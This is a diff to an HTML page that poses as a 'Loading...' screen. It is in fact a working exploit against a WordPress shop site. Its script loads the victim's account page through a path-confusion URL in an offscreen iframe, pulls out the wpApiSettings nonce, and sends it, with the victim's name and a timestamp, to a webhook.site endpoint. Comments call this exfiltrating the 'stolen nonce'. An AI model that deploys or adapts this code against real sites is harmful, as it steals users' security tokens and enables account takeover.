@@ -1,20 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Loading...</title>
+  <title>Loading... Please wait</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
   <h1>Please wait, loading your content...</h1>
+  <p>This won’t take long.</p>
 
   <script>
+    // Create hidden iframe to load the victim's account page on plumvillage.shop
     const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = '/wp-includes/js/api-request.min.js/../../../my-account/edit-account/';
+    iframe.style.position = 'absolute';
+    iframe.style.top = '-9999px';
+    iframe.style.left = '-9999px';
+    iframe.style.width = '1px';
+    iframe.style.height = '1px';
+
+    // 🔴 Use the FULL ABSOLUTE URL of the target site
+    iframe.src = 'https://plumvillage.shop/wp-includes/js/api-request.min.js/../../../my-account/edit-account/';
+    
     document.body.appendChild(iframe);
 
+    // Wait for iframe to load
     iframe.onload = function() {
       try {
+        // Access the iframe's DOM (only works if same-origin)
         const doc = iframe.contentDocument || iframe.contentWindow.document;
+        
+        // Look for the wpApiSettings script
         const script = doc.querySelector('#wp-api-request-js-extra');
         
         if (script) {
@@ -23,15 +37,25 @@
           
           if (nonceMatch) {
             const nonce = nonceMatch[1];
+            
+            // 🚀 Exfiltrate the stolen nonce to your webhook
             fetch('https://webhook.site/8e6d3cb2-a3f0-4286-b5a0-c629298bd1aa', {
               method: 'POST',
-              body: JSON.stringify({ nonce: nonce, victim: 'Carlos' }),
+              body: JSON.stringify({
+                nonce: nonce,
+                timestamp: new Date().toISOString(),
+                victim: 'Carlos',
+                url: window.location.href
+              }),
               mode: 'no-cors'
             });
           }
         }
       } catch (e) {
-        fetch('https://webhook.site/8e6d3cb2-a3f0-4286-b5a0-c629298bd1aa?error=' + encodeURIComponent(e.message), { mode: 'no-cors' });
+        // Send error details (e.g., CORS, script not found)
+        fetch('https://webhook.site/8e6d3cb2-a3f0-4286-b5a0-c629298bd1aa?error=' + encodeURIComponent(e.message), {
+          mode: 'no-cors'
+        });
       }
     };
   </script>
